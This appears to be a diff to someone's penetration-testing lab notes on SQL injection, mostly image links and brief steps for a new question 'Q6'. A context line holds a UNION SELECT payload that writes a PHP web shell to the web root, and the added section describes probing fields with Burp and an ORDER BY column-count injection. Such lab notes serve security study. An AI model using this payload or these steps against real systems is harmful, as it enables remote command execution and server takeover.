@@ -183,3 +183,16 @@ To identify columns.
 ' UNION SELECT null, null, null, null, "<?php system($_GET['cmd']);?>", null INTO OUTFILE "/var/www/html/webshell.php" -- //
 
 ![[Pasted image 20231004214100.png]]
+### Q6
+First identify which port is open
+
+![[Pasted image 20231005200443.png]]
+![[Pasted image 20231005200459.png]]
+
+![[Pasted image 20231005200620.png]]
+try every field available for injection, and if it doen't work, try every field in it using burp
+
+![[Pasted image 20231005200358.png]]
+
+![[Pasted image 20231005201451.png]]
+no errors in **'ORDER%20BY%206--//**
